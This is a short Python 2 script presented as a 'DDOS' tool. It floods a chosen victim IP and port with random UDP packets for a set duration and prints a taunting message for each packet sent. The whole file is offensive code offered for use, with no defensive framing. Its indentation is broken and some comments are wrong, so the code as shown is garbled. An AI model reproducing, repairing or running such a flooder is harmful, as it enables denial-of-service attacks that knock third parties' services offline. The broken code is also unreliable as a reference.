import socket
import struct
import codecs
import sys
import threading
import random 
import time
import os

    def usage( ) :
           print  " ========================== "
           print  "     DDOS - TOOLS - BY-S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿    "
           print  " iii III III        IIII III III            IIIIIIIIII "
           print  " III III   III      III  III     III     III          III "
           print  " III III     III    III  III        III  III          III "
           print  " III III       III  III  III        III  III          III "
           print  " III III        III III  III     III     III          III "
           print  " iii III           IIIII  III  III          IIIIIIIIII "
           print  " =========================== "
           print  "# ===SUBSCRIBE DitDit Roleplay=== #"
           
      def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000
    
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print " Remake By S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ %s Cie kena disenggol %s IP | PORT %s "%(sent, victim, vport)

    def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
